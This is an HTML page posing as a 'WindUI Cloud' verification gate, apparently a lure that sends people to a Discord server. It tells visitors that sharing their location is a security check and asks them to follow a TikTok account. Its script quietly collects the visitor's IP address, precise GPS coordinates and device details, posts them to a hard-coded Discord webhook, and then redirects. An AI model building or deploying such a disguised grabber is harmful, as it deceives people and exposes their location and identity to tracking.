<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify to Access - WindUI Cloud</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #7c3aed;
            --glass: rgba(255, 255, 255, 0.05);
            --border: rgba(255, 255, 255, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            background: radial-gradient(circle at top left, #1e1b4b, #09090b);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            overflow: hidden;
        }

        /* Glass UI Container */
        .container {
            background: var(--glass);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 40px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            animation: fadeIn 0.8s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
            background: linear-gradient(to right, #a78bfa, #7c3aed);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .desc {
            font-size: 14px;
            color: #a1a1aa;
            margin-bottom: 30px;
        }

        .task-list {
            text-align: left;
            margin-bottom: 30px;
        }

        .task-item {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: 0.3s;
        }

        .task-item:hover {
            background: rgba(255, 255, 255, 0.06);
        }

        .task-info h4 {
            font-size: 14px;
            margin-bottom: 2px;
        }

        .task-info p {
            font-size: 11px;
            color: #71717a;
        }

        .btn-action {
            background: var(--primary);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            font-size: 12px;
            cursor: pointer;
            transition: 0.3s;
        }

        .btn-action:disabled {
            background: #3f3f46;
            cursor: not-allowed;
        }

        .verify-status {
            font-size: 13px;
            margin-bottom: 15px;
            color: #d8b4fe;
        }

        #final-verify {
            width: 100%;
            padding: 15px;
            border-radius: 12px;
            border: none;
            background: linear-gradient(to right, #7c3aed, #4f46e5);
            color: white;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            opacity: 0.5;
            pointer-events: none;
            transition: 0.5s;
        }

        #final-verify.active {
            opacity: 1;
            pointer-events: all;
            box-shadow: 0 0 20px rgba(124, 58, 237, 0.4);
        }

        .completed-icon {
            display: none;
            color: #22c55e;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">Verification System</div>
        <p class="desc">Please complete the steps to continue</p>

        <div class="task-list">
            <div class="task-item" id="task-location">
                <div class="task-info">
                    <h4>Allow Location</h4>
                    <p>Required for security check</p>
                </div>
                <button class="btn-action" onclick="getLocation()">Allow</button>
                <span class="completed-icon">✓</span>
            </div>

            <div class="task-item" id="task-tiktok">
                <div class="task-info">
                    <h4>Follow TikTok</h4>
                    <p>@imc72s</p>
                </div>
                <button class="btn-action" onclick="followTikTok()">Follow</button>
                <span class="completed-icon">✓</span>
            </div>
        </div>

        <div class="verify-status" id="status-text">Verify [0/2]</div>
        <button id="final-verify" onclick="finishVerification()">Verify & Proceed</button>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1456850925493944503/b71kuDgFhoA_4Aqp2iydvrMriN1cXy9WSopgbd31Qw_6aJ0AmoYvtbOwIVn2GSgH9hVw";
        const FINAL_REDIRECT = "https://discord.gg/DvXMNfRjQr";
        
        let completedTasks = 0;
        let userData = {
            ip: "Loading...",
            location: "Denied",
            device: navigator.userAgent,
            time: new Date().toLocaleString('th-TH')
        };

        // ดึง IP ตั้งแต่เริ่มโหลดหน้าเว็บ
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => userData.ip = data.ip);

        function updateProgress() {
            completedTasks++;
            document.getElementById('status-text').innerText = `Verify [${completedTasks}/2]`;
            if (completedTasks === 2) {
                const btn = document.getElementById('final-verify');
                btn.classList.add('active');
                btn.innerText = "Access Granted";
            }
        }

        async function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    // แปลงพิกัดเป็นที่อยู่เบื้องต้นผ่าน API (Optional)
                    userData.location = `Lat: ${lat}, Lon: ${lon} (https://www.google.com/maps?q=${lat},${lon})`;
                    
                    document.querySelector('#task-location .btn-action').style.display = 'none';
                    document.querySelector('#task-location .completed-icon').style.display = 'block';
                    updateProgress();
                }, (err) => {
                    alert("กรุณาอนุญาตตำแหน่งเพื่อยืนยันตัวตน");
                });
            }
        }

        function followTikTok() {
            window.open('https://www.tiktok.com/@imc72s', '_blank');
            setTimeout(() => {
                document.querySelector('#task-tiktok .btn-action').style.display = 'none';
                document.querySelector('#task-tiktok .completed-icon').style.display = 'block';
                updateProgress();
            }, 2000);
        }

        async function finishVerification() {
            // ส่งข้อมูลเข้า Discord Webhook
            const payload = {
                embeds: [{
                    title: "🚀 New User Verified!",
                    color: 0x7c3aed,
                    fields: [
                        { name: "🌐 IP Address", value: userData.ip, inline: true },
                        { name: "🕒 Time", value: userData.time, inline: true },
                        { name: "📍 Location", value: userData.location },
                        { name: "📱 Device Info", value: "```" + userData.device + "```" }
                    ],
                    footer: { text: "WindUI Cloud Security Protocol" }
                }]
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                // ไปยังลิงก์ที่ตั้งไว้
                window.location.href = FINAL_REDIRECT;
            } catch (e) {
                console.error("Error sending webhook");
                window.location.href = FINAL_REDIRECT; // ยังคง Redirect แม้ Webhook จะพลาด
            }
        }
    </script>
</body>
</html>
